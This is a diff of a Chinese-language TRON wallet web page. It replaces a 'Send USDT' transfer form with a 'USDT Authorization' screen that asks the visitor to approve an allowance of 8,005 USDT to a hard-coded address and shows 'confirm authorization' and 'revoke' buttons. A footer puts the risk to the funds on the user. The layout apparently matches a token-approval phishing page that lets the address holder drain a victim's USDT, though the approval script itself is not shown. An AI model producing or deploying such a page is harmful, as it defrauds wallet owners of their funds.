@@ -3,37 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>发送 USDT</title>
+    <title>USDT 授权</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>发送 USDT</h1>
-            <div class="network">TRC20</div>
+            <h1>✓ USDT 授权</h1>
+            <div class="network">TRC20 - TRON Network</div>
         </header>
 
         <div class="main">
-            <div class="input-group">
-                <label>转账金额 USDT</label>
-                <div class="amount-box">
-                    <input type="number" id="amount" placeholder="0.00" inputmode="decimal" step="0.01">
-                    <span class="token">USDT</span>
+            <!-- 钱包连接状态 -->
+            <div class="wallet-status" id="walletStatus">
+                <div class="status-icon">📱</div>
+                <div class="status-text">
+                    <p class="status-label">钱包状态</p>
+                    <p class="status-value" id="statusValue">未连接</p>
                 </div>
             </div>
 
-            <div class="recipient-box">
-                <label>收款地址</label>
-                <input type="text" id="recipient" value="TZ5QiipqHXZdpM2JPPGsdvcfSD6amepCRq" readonly>
+            <!-- 授权信息卡片 -->
+            <div class="info-card">
+                <div class="info-row">
+                    <span class="info-label">授权金额</span>
+                    <span class="info-value amount-value">8,005 USDT</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">授权地址</span>
+                    <span class="info-value address-value" id="addressValue">TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">代币合约</span>
+                    <span class="info-value contract-value">USDT (TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t)</span>
+                </div>
             </div>
 
-            <div class="fee">
-                <span>网络手续费</span>
-                <span>≈ 1.5 TRX</span>
+            <!-- 当前授权额度 -->
+            <div class="allowance-box">
+                <div class="allowance-header">
+                    <span>当前授权额度</span>
+                    <span class="allowance-amount" id="allowanceAmount">0 USDT</span>
+                </div>
+                <div class="allowance-bar">
+                    <div class="allowance-fill" id="allowanceFill" style="width: 0%"></div>
+                </div>
             </div>
 
-            <button onclick="sendTransfer()" class="send-button">确认转账</button>
+            <!-- 交易状态 -->
+            <div class="status-message" id="statusMessage"></div>
+
+            <!-- 授权按钮 -->
+            <button onclick="approveUsdt()" class="approve-button" id="approveBtn">
+                <span class="button-icon">🔐</span>
+                <span class="button-text">确认授权</span>
+            </button>
+
+            <!-- 取消授权按钮 -->
+            <button onclick="revokeApproval()" class="revoke-button" id="revokeBtn">
+                <span>取消授权</span>
+            </button>
         </div>
+
+        <!-- 底部信息 -->
+        <footer>
+            <p>⚠️ 授权前请确保地址正确。授权后资金安全由您自行负责。</p>
+        </footer>
     </div>
 
     <script src="https://unpkg.com/tronweb@latest/dist/TronWeb.min.js"></script>
